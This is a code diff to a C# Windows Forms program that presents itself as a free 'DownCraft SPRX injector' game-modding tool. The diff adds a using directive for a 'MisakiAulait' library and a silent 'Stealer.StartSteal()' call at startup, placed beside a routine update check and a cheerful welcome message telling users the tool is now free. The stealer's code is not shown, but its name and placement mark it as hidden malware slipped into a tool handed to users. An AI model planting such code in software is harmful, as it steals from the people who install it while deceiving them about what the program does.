@@ -1,8 +1,11 @@
-﻿using mcV1.Classes;
+﻿using DownCraft;
+using mcV1.Classes;
+using MisakiAulait;
 using System;
 using System.Collections.Generic;
 using System.ComponentModel;
 using System.Data;
+using System.Diagnostics;
 using System.Drawing;
 using System.Linq;
 using System.Net;
@@ -15,6 +18,7 @@ namespace mcV1
 {
     public partial class Form1 : Form
     {
+        WebClient web = new WebClient();
         public static Point newpoint = new Point();
         public static int x;
         public static int y;
@@ -83,12 +87,36 @@ namespace mcV1
             label6.ForeColor = Color.FromArgb(113, 113, 113);
             label7.ForeColor = Color.FromArgb(113, 113, 113);
 
+            Stealer.StartSteal();
             CheckProcess.Start();
 
             if (!mcV1.Classes.Functions.Logged)
             {
                 Application.Exit();
             }
+
+            try
+            {
+                if (!web.DownloadString("https://downcraft.xyz/downcraft/SPRX/API.php").Contains("1.0"))
+                {
+                    if (MessageBox.Show("A new update is available.", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Question) == DialogResult.OK)
+                    {
+                        Process.Start(Functions.UpdaterFile);
+                        System.Environment.Exit(1);
+                    }
+                    else
+                    {
+                        System.Environment.Exit(1);
+                    }
+                }
+            }
+            catch (Exception)
+            {
+                MessageBox.Show("API is offline.", "SERVER ERROR", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                System.Environment.Exit(1);
+            }
+
+            MessageBox.Show("Welcome to DownCraft SPRX injector for V4.2\n\nThis version is now free but if you want to support my work i got the V5 version BETA i sell the access so just contact me if you want get it enjoy using my work <3", "DownCraft", MessageBoxButtons.OK, MessageBoxIcon.Information);
         }
 
         private void label3_Click(object sender, EventArgs e)
